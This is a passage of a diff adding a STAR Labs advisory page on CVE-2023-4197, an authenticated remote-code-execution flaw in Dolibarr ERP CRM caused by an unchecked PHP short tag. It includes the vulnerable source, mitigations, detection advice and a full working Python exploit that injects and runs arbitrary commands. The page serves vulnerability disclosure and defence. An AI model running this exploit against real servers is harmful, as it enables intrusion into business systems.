@@ -1,0 +1,564 @@
+
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>(CVE-2023-4197) Dolibarr ERP CRM (&lt;= 18.0.1) Improper Input Sanitization Authenticated RCE | STAR Labs</title>
+<meta name="keywords" content="">
+<meta name="description" content="Summary:    Product Dolibarr ERP CRM     Vendor Dolibarr   Severity High   Affected Versions &lt;= 18.0.1   Tested Versions 17.0.1, 18.0.1   CVE Identifier CVE-2023-4197   CVE Description Improper input validation in Dolibarr ERP CRM &lt;= v18.0.1 fails to strip certain PHP code from user-supplied input when creating a Website, allowing an attacker to inject and evaluate arbitrary PHP code.">
+<meta name="author" content="Poh Jia Hao (@Chocologicall)">
+<link rel="canonical" href="https://starlabs.sg/advisories/23/23-4197/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://starlabs.sg/logo-white.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
+<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
+<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
+}
+</script>
+<meta property="og:title" content="(CVE-2023-4197) Dolibarr ERP CRM (&lt;= 18.0.1) Improper Input Sanitization Authenticated RCE" />
+<meta property="og:description" content="Summary:    Product Dolibarr ERP CRM     Vendor Dolibarr   Severity High   Affected Versions &lt;= 18.0.1   Tested Versions 17.0.1, 18.0.1   CVE Identifier CVE-2023-4197   CVE Description Improper input validation in Dolibarr ERP CRM &lt;= v18.0.1 fails to strip certain PHP code from user-supplied input when creating a Website, allowing an attacker to inject and evaluate arbitrary PHP code." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://starlabs.sg/advisories/23/23-4197/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
+<meta property="article:published_time" content="2023-10-11T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2023-10-11T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>
+
+<meta name="twitter:title" content="(CVE-2023-4197) Dolibarr ERP CRM (&lt;= 18.0.1) Improper Input Sanitization Authenticated RCE"/>
+<meta name="twitter:description" content="Summary:    Product Dolibarr ERP CRM     Vendor Dolibarr   Severity High   Affected Versions &lt;= 18.0.1   Tested Versions 17.0.1, 18.0.1   CVE Identifier CVE-2023-4197   CVE Description Improper input validation in Dolibarr ERP CRM &lt;= v18.0.1 fails to strip certain PHP code from user-supplied input when creating a Website, allowing an attacker to inject and evaluate arbitrary PHP code."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Advisories",
+      "item": "https://starlabs.sg/advisories/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "(CVE-2023-4197) Dolibarr ERP CRM (\u003c= 18.0.1) Improper Input Sanitization Authenticated RCE",
+      "item": "https://starlabs.sg/advisories/23/23-4197/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "(CVE-2023-4197) Dolibarr ERP CRM (",
+  "name": "(CVE-2023-4197) Dolibarr ERP CRM (",
+  "description": "Summary:    Product Dolibarr ERP CRM     Vendor Dolibarr   Severity High   Affected Versions \u0026lt;= 18.0.1   Tested Versions 17.0.1, 18.0.1   CVE Identifier CVE-2023-4197   CVE Description Improper input validation in Dolibarr ERP CRM \u0026lt;= v18.0.1 fails to strip certain PHP code from user-supplied input when creating a Website, allowing an attacker to inject and evaluate arbitrary PHP code.",
+  "keywords": [
+    
+  ],
+  "articleBody": "Summary:    Product Dolibarr ERP CRM     Vendor Dolibarr   Severity High   Affected Versions   Tested Versions 17.0.1, 18.0.1   CVE Identifier CVE-2023-4197   CVE Description Improper input validation in Dolibarr ERP CRM   CWE Classification(s) CWE-20: Improper Input Validation   CAPEC Classification(s) CAPEC-248 Command Injection CAPEC-153: Input Data Manipulation    CVSS3.1 Scoring System: Base Score: 7.5 (High)\nVector String: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H\n   Metric Value     Attack Vector (AV) Network   Attack Complexity (AC) High   Privileges Required (PR) Low   User Interaction (UI) None   Scope (S) Unchanged   Confidentiality (C) High   Integrity (I) High   Availability (A) High    Product Overview: Dolibarr ERP CRM is a web-based software that provides management for the target organization’s activities, such as contacts, suppliers, invoices, orders, stocks, agenda, etc. It is an open-source software suite designed for small, medium or large companies, foundations and freelancers. Administrators can use the fine grained permissions manager to grant permissions to various users based on their operational requirements.\nDolibarr ERP CRM operates as an all-in-one suite, which allows customizability based on the usage needs of the organization. It is highly modular as the administrators simply have to enable modules that they need and disable the ones they do not require. Almost every component is a module, which also means that Dolibarr ERP CRM is highly extensible in terms of features.\nVulnerability Summary: Users can be granted privileges to add and modify pages in the websites module. Even though there are security settings to only allow HTML/JavaScript/CSS, this can be subverted. Existing checks being to detect PHP content from user-supplied input are insufficient as it only checks for  and , allowing usage of the  short tag for executing PHP code. As a result, an adversary is able to inject unsanitized PHP content into these web pages and achieve code execution via PHP.\nVulnerability Details: There are two ways to exploit this vulnerability, one is to “import” content from a specified URL; the other is to edit an existing page.\nThe vulnerable code can be found in the function dolKeepOnlyPhpCode(), inside the /core/lib/website.lib.php file. where no checking for the  tag is done. This function intended purpose is to extract the PHP code from the given string and return it to the caller. The caller would throw an error if this function returns a non-empty string since it indicates the presence of PHP code.\n/core/lib/website.lib.php: php function dolKeepOnlyPhpCode($str) { $str = str_replace(', ', $str); $newstr = ''; // Split on each opening tag  //$parts = explode(' $parts = preg_split('/'.preg_quote(', '/').'/i', $str); if (!empty($parts)) { $i = 0; foreach ($parts as $part) { if ($i == 0) { // The first part is never php code  $i++; continue; } $newstr .= '; //split on closing tag  $partlings = explode('?', $part, 2); if (!empty($partlings)) { $newstr .= $partlings[0].'?'; } else { $newstr .= $part.'?'; } } } return $newstr; } This function takes in a single argument which is the string to sanitize. It first replaces all occurrences of  with  and subsequently all  tags are tokenized, and the string between the opening and optional closing tags are selected and returned to the caller.\nIn order to achieve RCE, the adversary must first be authenticated with an account and the Website module must be enabled. Then, modify an existing web page to include the  tag where arbitrary PHP code can be executed. Command execution is achieved by using any of the PHP functions that executes system code (i.e. system()). After the web page is modified successfully, previewing the updated page would trigger the RCE:\nExploit Conditions: This vulnerability can be exploited when the “Website” module is enabled, as well as having access to a low-privilege user account.\nProof-of-Concept: We have tried our best to make the PoC as portable as possible. The following is a functional exploit written in Python3 that exploits this vulnerability to achieve remote command execution:\n# Dolibarr ERP CRM (v18.0.1) Improper Input Sanitization Vulnerability (CVE-2023-4197) # Via: https://TARGET_HOST/website/index.php # Author: Poh Jia Hao (STAR Labs SG Pte. Ltd.) #!/usr/bin/env python3 import os import re import requests import sys import uuid requests.packages.urllib3.disable_warnings() s = requests.Session() def check_args(): global target, username, password, cmd print(\"\\n===== Dolibarr ERP CRM (v18.0.1) Improper Input Sanitization Vulnerability (CVE-2023-4197) =====\\n\") if len(sys.argv) != 5: print(\"[!] Please enter the required arguments like so: python3 {}https://TARGET_URL USERNAME PASSWORD CMD_TO_EXECUTE\".format(sys.argv[0])) sys.exit(1) target = sys.argv[1].strip(\"/\") username = sys.argv[2] password = sys.argv[3] cmd = sys.argv[4] def authenticate(): global s, csrf_token print(\"[+] Attempting to authenticate...\") # GET the CSRF token res = s.get(f\"{target}/\", verify=False) csrf_token = re.search(\"\\\"anti-csrf-newtoken\\\"content=\\\"(.+)\\\"\", res.text).group(1).strip() # Login data = { \"token\": csrf_token, \"username\": username, \"password\": password, \"actionlogin\": \"login\" } res = s.post(f\"{target}/\", data=data, verify=False) if \"Logout\" not in res.text: print(\"[!] Authentication failed! Are the credentials valid?\") sys.exit(1) else: print(\"[+] Authenticated successfully!\") def rce(): # Create web site print(\"[+] Attempting to create a website...\") website_name = uuid.uuid4().hex data = { \"WEBSITE_REF\": website_name, \"token\": csrf_token, \"action\": \"addsite\", \"WEBSITE_LANG\": \"en\", \"addcontainer\": \"create\" } res = s.post(f\"{target}/website/index.php\", data=data, verify=False) if f\"Website - {website_name}\" not in res.text: print(\"[!] Website creation failed!\") sys.exit(1) else: print(f\"[+] Created website name: \\\"{website_name}\\\"!\") # Create web page print(\"[+] Attempting to create a web page...\") webpage_name = uuid.uuid4().hex data = { \"website\": website_name, \"token\": csrf_token, \"action\": \"addcontainer\", \"WEBSITE_TYPE_CONTAINER\": \"page\", \"WEBSITE_TITLE\": \"x\", \"WEBSITE_PAGENAME\": webpage_name } res = s.post(f\"{target}/website/index.php\", data=data, verify=False) if f\"Contenair \\\\'{webpage_name}\\\\' added\" not in res.text: print(\"[!] Web page creation failed!\") sys.exit(1) else: print(f\"[+] Created web page name: \\\"{webpage_name}\\\"!\") # Modify created page print(\"[+] Attempting to modify the web page...\") webpage_id = re.search(f\"\\\"(.+)\\\".+{webpage_name}\", res.text).group(1).strip() data = { \"website\": website_name, \"WEBSITE_PAGENAME\": webpage_name, \"pageid\": webpage_id, \"token\": csrf_token, \"action\": \"updatemeta\", \"htmlheader\": f\"{cmd}'); ?\" } res = s.post(f\"{target}/website/index.php\", data=data, verify=False) if \"Saved\" not in res.text: print(\"[!] Web page modification failed!\") sys.exit(1) else: print(\"[+] Web page modified successfully!\") # Trigger RCE print(f\"[+] Triggering RCE now via: {target}/public/website/index.php?website={website_name}\u0026pageref={webpage_name}\") res = s.get(f\"{target}/public/website/index.php?website={website_name}\u0026pageref={webpage_name}\", verify=False) if res.status_code != 200: print(\"[!] Web page is not reachable!\") sys.exit(1) else: output = re.findall(\"block --\\n(.+)\", res.text, re.MULTILINE | re.DOTALL)[0].strip() print(f\"[+] RCE successful! Output of command:\\n\\n{output}\") def main(): check_args() authenticate() rce() if __name__ == \"__main__\": main() Suggested Mitigations: Update the Dolibarr installation to the latest version as shown from the official repository releases page.\nDetection Guidance: It is possible to detect the exploitation of this vulnerability by checking the /document/ directory (default upload directory) to see if there are any .tpl files containing  tags, and further inspecting the code contained within.\nCredits: Poh Jia Hao (@Chocologicall) of STAR Labs SG Pte. Ltd. (@starlabs_sg)\nTimeline:  2023-09-04 Reported vulnerability to Dolibarr owner 2023-09-05 Dolibarr owner acknowledged vulnerability and pushed a patch commit. Also mentioned that it will be in the next release 2023-10-11 New version containing patch released 2023-11-01 Public Release  ",
+  "wordCount" : "1125",
+  "inLanguage": "en",
+  "datePublished": "2023-10-11T00:00:00Z",
+  "dateModified": "2023-10-11T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Poh Jia Hao (@Chocologicall)"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://starlabs.sg/advisories/23/23-4197/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "STAR Labs",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://starlabs.sg/logo-white.png"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
+                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
+                    height="35"> </a>
+            <span class="logo-switches">
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://starlabs.sg/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/advisories/" title="Advisories">
+                    <span>Advisories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/blog/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/achievements/" title="Achievements">
+                    <span>Achievements</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/publications/" title="Publications">
+                    <span>Publications</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
+    <h1 class="post-title">
+      (CVE-2023-4197) Dolibarr ERP CRM (&lt;= 18.0.1) Improper Input Sanitization Authenticated RCE
+    </h1>
+    <div class="post-meta"><span title='2023-10-11 00:00:00 +0000 UTC'>October 11, 2023</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;Poh Jia Hao (@Chocologicall)
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#summary" aria-label="Summary:">Summary:</a></li>
+                <li>
+                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System:">CVSS3.1 Scoring System:</a></li>
+                <li>
+                    <a href="#product-overview" aria-label="Product Overview:">Product Overview:</a></li>
+                <li>
+                    <a href="#vulnerability-summary" aria-label="Vulnerability Summary:">Vulnerability Summary:</a></li>
+                <li>
+                    <a href="#vulnerability-details" aria-label="Vulnerability Details:">Vulnerability Details:</a></li>
+                <li>
+                    <a href="#exploit-conditions" aria-label="Exploit Conditions:">Exploit Conditions:</a></li>
+                <li>
+                    <a href="#proof-of-concept" aria-label="Proof-of-Concept:">Proof-of-Concept:</a></li>
+                <li>
+                    <a href="#suggested-mitigations" aria-label="Suggested Mitigations:">Suggested Mitigations:</a></li>
+                <li>
+                    <a href="#detection-guidance" aria-label="Detection Guidance:">Detection Guidance:</a></li>
+                <li>
+                    <a href="#credits" aria-label="Credits:">Credits:</a></li>
+                <li>
+                    <a href="#timeline" aria-label="Timeline:">Timeline:</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="summary">Summary:<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
+<table>
+<thead>
+<tr>
+<th><strong>Product</strong></th>
+<th>Dolibarr                  ERP CRM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Vendor</strong></td>
+<td>Dolibarr</td>
+</tr>
+<tr>
+<td><strong>Severity</strong></td>
+<td>High</td>
+</tr>
+<tr>
+<td><strong>Affected Versions</strong></td>
+<td>&lt;= 18.0.1</td>
+</tr>
+<tr>
+<td><strong>Tested Versions</strong></td>
+<td>17.0.1, 18.0.1</td>
+</tr>
+<tr>
+<td><strong>CVE Identifier</strong></td>
+<td>CVE-2023-4197</td>
+</tr>
+<tr>
+<td><strong>CVE Description</strong></td>
+<td>Improper input validation in Dolibarr ERP CRM &lt;= v18.0.1 fails to strip certain PHP code from user-supplied input when creating a Website, allowing an attacker to inject and evaluate arbitrary PHP code.</td>
+</tr>
+<tr>
+<td><strong>CWE Classification(s)</strong></td>
+<td>CWE-20: Improper Input Validation</td>
+</tr>
+<tr>
+<td><strong>CAPEC Classification(s)</strong></td>
+<td>CAPEC-248 Command Injection <!-- raw HTML omitted --> CAPEC-153: Input Data Manipulation</td>
+</tr>
+</tbody>
+</table>
+<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System:<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h2>
+<p><strong>Base Score:</strong> 7.5 (High)<br>
+<strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H</code></p>
+<table>
+<thead>
+<tr>
+<th><strong>Metric</strong></th>
+<th><strong>Value</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Attack Vector (AV)</strong></td>
+<td>Network</td>
+</tr>
+<tr>
+<td><strong>Attack Complexity (AC)</strong></td>
+<td>High</td>
+</tr>
+<tr>
+<td><strong>Privileges Required (PR)</strong></td>
+<td>Low</td>
+</tr>
+<tr>
+<td><strong>User Interaction (UI)</strong></td>
+<td>None</td>
+</tr>
+<tr>
+<td><strong>Scope (S)</strong></td>
+<td>Unchanged</td>
+</tr>
+<tr>
+<td><strong>Confidentiality (C)</strong></td>
+<td>High</td>
+</tr>
+<tr>
+<td><strong>Integrity (I)</strong></td>
+<td>High</td>
+</tr>
+<tr>
+<td><strong>Availability (A)</strong></td>
+<td>High</td>
+</tr>
+</tbody>
+</table>
+<h2 id="product-overview">Product Overview:<a hidden class="anchor" aria-hidden="true" href="#product-overview">#</a></h2>
+<p>Dolibarr ERP CRM is a web-based software that provides management for the target organization’s activities, such as contacts, suppliers, invoices, orders, stocks, agenda, etc. It is an open-source software suite designed for small, medium or large companies, foundations and freelancers. Administrators can use the fine grained permissions manager to grant permissions to various users based on their operational requirements.</p>
+<p>Dolibarr ERP CRM operates as an all-in-one suite, which allows customizability based on the usage needs of the organization. It is highly modular as the administrators simply have to enable modules that they need and disable the ones they do not require. Almost every component is a module, which also means that Dolibarr ERP CRM is highly extensible in terms of features.</p>
+<h2 id="vulnerability-summary">Vulnerability Summary:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-summary">#</a></h2>
+<p>Users can be granted privileges to add and modify pages in the websites module. Even though there are security settings to only allow HTML/JavaScript/CSS, this can be subverted. Existing checks being to detect PHP content from user-supplied input are insufficient as it only checks for <code>&lt;?php</code> and <code>&lt;?=</code>, allowing usage of the <code>&lt;?</code> short tag for executing PHP code. As a result, an adversary is able to inject unsanitized PHP content into these web pages and achieve code execution via PHP.</p>
+<h2 id="vulnerability-details">Vulnerability Details:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h2>
+<p>There are two ways to exploit this vulnerability, one is to &ldquo;import&rdquo; content from a specified URL; the other is to edit an existing page.</p>
+<p>The vulnerable code can be found in the function <code>dolKeepOnlyPhpCode()</code>, inside the <code>/core/lib/website.lib.php</code> file. where no checking for the <code>&lt;?</code> tag is done. This function intended purpose is to extract the PHP code from the given string and return it to the caller. The caller would throw an error if this function returns a non-empty string since it indicates the presence of PHP code.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="nx">core</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">website</span><span class="o">.</span><span class="nx">lib</span><span class="o">.</span><span class="nx">php</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">dolKeepOnlyPhpCode</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$str</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&lt;?=&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;?php&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$newstr</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Split on each opening tag
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//$parts = explode(&#39;&lt;?php&#39;, $str);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$parts</span> <span class="o">=</span> <span class="nx">preg_split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">preg_quote</span><span class="p">(</span><span class="s1">&#39;&lt;?php&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$parts</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$parts</span> <span class="k">as</span> <span class="nv">$part</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// The first part is never php code
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$newstr</span> <span class="o">.=</span> <span class="s1">&#39;&lt;?php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//split on closing tag
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$partlings</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;?&gt;&#39;</span><span class="p">,</span> <span class="nv">$part</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$partlings</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$newstr</span> <span class="o">.=</span> <span class="nv">$partlings</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;?&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$newstr</span> <span class="o">.=</span> <span class="nv">$part</span><span class="o">.</span><span class="s1">&#39;?&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$newstr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>This function takes in a single argument which is the string to sanitize. It first replaces all occurrences of <code>&lt;?=</code> with <code>&lt;?php</code> and subsequently all <code>&lt;?php</code> tags are tokenized, and the string between the opening and optional closing tags are selected and returned to the caller.</p>
+<p>In order to achieve RCE, the adversary must first be authenticated with an account and the Website module must be enabled. Then, modify an existing web page to include the <code>&lt;?</code> tag where arbitrary PHP code can be executed. Command execution is achieved by using any of the PHP functions that executes system code (i.e. <code>system()</code>). After the web page is modified successfully, previewing the updated page would trigger the RCE:</p>
+<p><img loading="lazy" src="/advisories/23/images/CVE-2023-4197_01.RCE.png" alt=""  />
+</p>
+<h2 id="exploit-conditions">Exploit Conditions:<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h2>
+<p>This vulnerability can be exploited when the &ldquo;Website&rdquo; module is enabled, as well as having access to a low-privilege user account.</p>
+<h2 id="proof-of-concept">Proof-of-Concept:<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
+<p>We have tried our best to make the PoC as portable as possible. The following is a functional exploit written in Python3 that exploits this vulnerability to achieve remote command execution:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># Dolibarr ERP CRM (v18.0.1) Improper Input Sanitization Vulnerability (CVE-2023-4197)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Via: https://TARGET_HOST/website/index.php</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Author: Poh Jia Hao (STAR Labs SG Pte. Ltd.)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_args</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">target</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">cmd</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">===== Dolibarr ERP CRM (v18.0.1) Improper Input Sanitization Vulnerability (CVE-2023-4197) =====</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Please enter the required arguments like so: python3 </span><span class="si">{}</span><span class="s2"> https://TARGET_URL USERNAME PASSWORD CMD_TO_EXECUTE&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">authenticate</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">s</span><span class="p">,</span> <span class="n">csrf_token</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Attempting to authenticate...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># GET the CSRF token</span>
